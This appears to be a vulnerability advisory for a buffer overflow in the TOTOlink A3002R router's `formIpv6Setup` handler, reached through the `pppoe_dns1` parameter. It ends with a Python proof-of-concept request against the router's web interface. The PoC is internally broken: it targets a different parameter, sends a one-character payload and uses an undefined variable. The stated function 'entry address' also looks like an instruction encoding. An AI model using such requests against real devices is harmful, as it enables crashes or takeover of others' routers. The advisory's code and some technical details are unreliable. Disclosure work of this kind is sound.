# TARGET
TOTOlink A3002R
V1.1.1-B20200824.0128
# BUG TYPE
buffer overflow
# Abstract
The TOTOlink A3002R router device contains a buffer overflow vulnerability in its firmware version V1.1.1-B20200824.0128. The vulnerability arises from the improper input validation of the `pppoe_dns1` parameter in the `formIpv6Setup` interface of `/bin/boa`. A remote attacker could exploit this flaw to execute arbitrary code on the system or cause a denial of service.
# Details
`/squashfs-root/bin/boa`
![](https://github.com/SunnyYANGyaya/cuicuishark-sheep-fishIOT/blob/main/ToTolink/figures/Snipaste_2025-01-17_14-59-19.png)

By analyzing the `formIpv6Setup` function in `/bin/boa` using IDA, we find that the entry address of the function is `0x27BDFD68`. It is evident that the `v39` variable is passed to `v51` via `strcpy` without any filtering or length checks. Through further analysis, it is clear that the controllable `pppoe_dns1` parameter can lead to a buffer overflow vulnerability. The function `sub_410510` reads the user-provided "`pppoe_dns1`" data, and `strcpy` copies the string pointed to by `v39` to `v51` without verifying whether `v51` has enough space to store the copied string. If the string pointed to by `v39` exceeds the size of the `v51` buffer, it can cause a buffer overflow, potentially overwriting adjacent memory regions and leading to undefined behavior. This may result in program crashes or, if exploited by an attacker, further compromise the system.

An attacker can exploit the buffer overflow vulnerability by sending an API request, using a malicious configuration file, or crafting a specially crafted HTTP request with an excessively long `pppoe_dns1` string, potentially causing the program to crash.


# POC

```
import requests
import os 
url = "http://192.168.0.1/boafrm/formIpv6Setup"
repeated = "A"
data = "submit-url=%2FIPv6_Setup.htm&update=&wan_enable=1&OriginType=0&enable_dhcpv6RapidCommit={}".format (repeated)
response = requests.post (url, data=data, headers=headers,verify=False)
print ("nmap... ...")
os.system ("nmap 192.168.0.1")
```
